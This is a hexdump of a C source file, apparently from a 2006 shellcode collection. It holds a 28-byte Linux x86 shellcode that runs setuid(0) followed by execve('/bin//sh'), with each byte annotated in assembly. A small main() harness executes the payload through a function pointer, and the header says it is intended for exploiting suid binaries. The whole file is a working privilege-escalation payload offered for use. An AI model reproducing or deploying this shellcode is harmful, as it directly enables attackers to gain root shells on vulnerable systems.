00000000  2f 2a 0d 0a 20 2a 20 72  65 76 65 6e 67 65 2d 73  |/*.. * revenge-s|
00000010  65 74 75 69 64 2e 63 2c  20 76 31 2e 30 20 32 30  |etuid.c, v1.0 20|
00000020  30 36 2f 30 39 2f 33 30  20 31 34 3a 35 37 0d 0a  |06/09/30 14:57..|
00000030  20 2a 0d 0a 20 2a 20 6c  69 6e 75 78 2f 78 38 36  | *.. * linux/x86|
00000040  20 73 65 74 75 69 64 28  30 29 20 2b 20 65 78 65  | setuid(0) + exe|
00000050  63 76 65 28 22 2f 62 69  6e 2f 2f 73 68 22 2c 20  |cve("/bin//sh", |
00000060  5b 22 2f 62 69 6e 2f 2f  73 68 22 5d 2c 20 4e 55  |["/bin//sh"], NU|
00000070  4c 4c 29 20 73 68 65 6c  6c 63 6f 64 65 0d 0a 20  |LL) shellcode.. |
00000080  2a 20 6f 6e 63 65 20 61  67 61 69 6e 2e 2e 2e 0d  |* once again....|
00000090  0a 20 2a 0d 0a 20 2a 20  5b 20 20 20 20 73 65 74  |. *.. * [    set|
000000a0  75 69 64 20 28 36 20 62  79 74 65 73 29 20 2b 20  |uid (6 bytes) + |
000000b0  65 78 65 63 76 65 20 28  32 32 20 62 79 74 65 73  |execve (22 bytes|
000000c0  29 20 20 3d 20 32 38 20  62 79 74 65 73 20 20 20  |)  = 28 bytes   |
000000d0  20 20 20 20 5d 0d 0a 20  2a 20 5b 20 20 20 20 20  |    ].. * [     |
000000e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00000110  20 20 20 20 20 20 5d 0d  0a 20 2a 20 5b 20 20 20  |      ].. * [   |
00000120  20 53 61 6d 65 20 61 73  20 72 65 76 65 6e 67 65  | Same as revenge|
00000130  2d 65 78 65 63 76 65 2e  63 20 77 65 20 73 74 61  |-execve.c we sta|
00000140  72 74 20 74 68 65 20 32  20 73 79 73 74 65 6d 20  |rt the 2 system |
00000150  20 20 20 20 20 20 20 20  5d 0d 0a 20 2a 20 5b 20  |        ].. * [ |
00000160  20 20 20 63 61 6c 6c 73  20 77 69 74 68 20 61 20  |   calls with a |
00000170  6d 6f 76 20 72 65 73 75  6c 74 69 6e 67 20 69 6e  |mov resulting in|
00000180  20 32 20 62 79 74 65 73  20 6c 65 73 73 2c 20 62  | 2 bytes less, b|
00000190  75 74 20 20 20 20 20 20  20 20 5d 0d 0a 20 2a 20  |ut        ].. * |
000001a0  5b 20 20 20 20 74 68 69  73 20 6f 6e 65 20 69 73  |[    this one is|
000001b0  20 6f 6e 6c 79 20 66 6f  72 20 73 75 69 64 20 62  | only for suid b|
000001c0  69 6e 61 72 79 20 65 78  70 6c 6f 69 74 61 74 69  |inary exploitati|
000001d0  6f 6e 2e 20 20 20 20 20  20 20 20 20 5d 0d 0a 20  |on.         ].. |
000001e0  2a 20 5b 20 20 20 20 20  20 20 20 20 20 20 20 20  |* [             |
000001f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00000210  20 20 20 20 20 20 20 20  20 20 20 20 20 20 5d 0d  |              ].|
00000220  0a 20 2a 0d 0a 20 2a 20  68 74 74 70 3a 2f 2f 77  |. *.. * http://w|
00000230  77 77 2e 30 78 63 61 66  65 62 61 62 65 2e 69 74  |ww.0xcafebabe.it|
00000240  0d 0a 20 2a 20 3c 72 65  76 65 6e 67 65 40 30 78  |.. * <revenge@0x|
00000250  63 61 66 65 62 61 62 65  2e 69 74 3e 0d 0a 20 2a  |cafebabe.it>.. *|
00000260  0d 0a 20 2a 2f 0d 0a 0d  0a 63 68 61 72 20 73 63  |.. */....char sc|
00000270  5b 5d 20 3d 0d 0a 20 20  20 20 20 20 20 20 20 20  |[] =..          |
00000280  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000290  20 20 20 20 20 20 20 20  20 20 20 2f 2f 20 3c 5f  |           // <_|
000002a0  73 74 61 72 74 3e 0d 0a  20 20 20 20 20 20 20 22  |start>..       "|
000002b0  5c 78 62 30 5c 78 31 37  22 20 20 20 20 20 20 20  |\xb0\x17"       |
000002c0  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
000002d0  6d 6f 76 20 20 20 20 24  30 78 31 37 2c 25 61 6c  |mov    $0x17,%al|
000002e0  0d 0a 20 20 20 20 20 20  20 22 5c 78 33 31 5c 78  |..       "\x31\x|
000002f0  64 62 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |db"             |
00000300  20 20 20 20 20 20 20 2f  2f 20 78 6f 72 20 20 20  |       // xor   |
00000310  20 25 65 62 78 2c 25 65  62 78 0d 0a 20 20 20 20  | %ebx,%ebx..    |
00000320  20 20 20 22 5c 78 63 64  5c 78 38 30 22 20 20 20  |   "\xcd\x80"   |
00000330  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000340  20 2f 2f 20 69 6e 74 20  20 20 20 24 30 78 38 30  | // int    $0x80|
00000350  0d 0a 20 20 20 20 20 20  20 22 5c 78 62 30 5c 78  |..       "\xb0\x|
00000360  30 62 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |0b"             |
00000370  20 20 20 20 20 20 20 2f  2f 20 6d 6f 76 20 20 20  |       // mov   |
00000380  20 24 30 78 62 2c 25 61  6c 0d 0a 20 20 20 20 20  | $0xb,%al..     |
00000390  20 20 22 5c 78 39 39 22  20 20 20 20 20 20 20 20  |  "\x99"        |
000003a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000003b0  2f 2f 20 63 6c 74 64 0d  0a 20 20 20 20 20 20 20  |// cltd..       |
000003c0  22 5c 78 35 32 22 20 20  20 20 20 20 20 20 20 20  |"\x52"          |
000003d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2f  |              //|
000003e0  20 70 75 73 68 20 20 20  25 65 64 78 0d 0a 20 20  | push   %edx..  |
000003f0  20 20 20 20 20 22 5c 78  36 38 5c 78 32 66 5c 78  |     "\x68\x2f\x|
00000400  32 66 5c 78 37 33 5c 78  36 38 22 20 20 20 20 20  |2f\x73\x68"     |
00000410  20 20 20 2f 2f 20 70 75  73 68 20 20 20 24 30 78  |   // push   $0x|
00000420  36 38 37 33 32 66 32 66  0d 0a 20 20 20 20 20 20  |68732f2f..      |
00000430  20 22 5c 78 36 38 5c 78  32 66 5c 78 36 32 5c 78  | "\x68\x2f\x62\x|
00000440  36 39 5c 78 36 65 22 20  20 20 20 20 20 20 20 2f  |69\x6e"        /|
00000450  2f 20 70 75 73 68 20 20  20 24 30 78 36 65 36 39  |/ push   $0x6e69|
00000460  36 32 32 66 0d 0a 20 20  20 20 20 20 20 22 5c 78  |622f..       "\x|
00000470  38 39 5c 78 65 33 22 20  20 20 20 20 20 20 20 20  |89\xe3"         |
00000480  20 20 20 20 20 20 20 20  20 20 20 2f 2f 20 6d 6f  |           // mo|
00000490  76 20 20 20 20 25 65 73  70 2c 25 65 62 78 0d 0a  |v    %esp,%ebx..|
000004a0  20 20 20 20 20 20 20 22  5c 78 35 32 22 20 20 20  |       "\x52"   |
000004b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000004c0  20 20 20 20 20 2f 2f 20  70 75 73 68 20 20 20 25  |     // push   %|
000004d0  65 64 78 0d 0a 20 20 20  20 20 20 20 22 5c 78 35  |edx..       "\x5|
000004e0  33 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |3"              |
000004f0  20 20 20 20 20 20 20 20  20 20 2f 2f 20 70 75 73  |          // pus|
00000500  68 20 20 20 25 65 62 78  0d 0a 20 20 20 20 20 20  |h   %ebx..      |
00000510  20 22 5c 78 38 39 5c 78  65 31 22 20 20 20 20 20  | "\x89\xe1"     |
00000520  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |               /|
00000530  2f 20 6d 6f 76 20 20 20  20 25 65 73 70 2c 25 65  |/ mov    %esp,%e|
00000540  63 78 0d 0a 20 20 20 20  20 20 20 22 5c 78 63 64  |cx..       "\xcd|
00000550  5c 78 38 30 22 20 20 20  20 20 20 20 20 20 20 20  |\x80"           |
00000560  20 20 20 20 20 20 20 20  20 2f 2f 20 69 6e 74 20  |         // int |
00000570  20 20 20 24 30 78 38 30  0d 0a 3b 0d 0a 0d 0a 69  |   $0x80..;....i|
00000580  6e 74 20 6d 61 69 6e 28  29 0d 0a 7b 0d 0a 20 20  |nt main()..{..  |
00000590  20 20 20 20 20 76 6f 69  64 20 20 20 20 28 2a 66  |     void    (*f|
000005a0  70 29 28 76 6f 69 64 29  20 3d 20 28 76 6f 69 64  |p)(void) = (void|
000005b0  20 28 2a 29 28 76 6f 69  64 29 29 73 63 3b 0d 0a  | (*)(void))sc;..|
000005c0  0d 0a 20 20 20 20 20 20  20 70 72 69 6e 74 66 28  |..       printf(|
000005d0  22 4c 65 6e 67 74 68 3a  20 25 64 5c 6e 22 2c 73  |"Length: %d\n",s|
000005e0  74 72 6c 65 6e 28 73 63  29 29 3b 0d 0a 20 20 20  |trlen(sc));..   |
000005f0  20 20 20 20 66 70 28 29  3b 0d 0a 7d              |    fp();..}|
000005fc
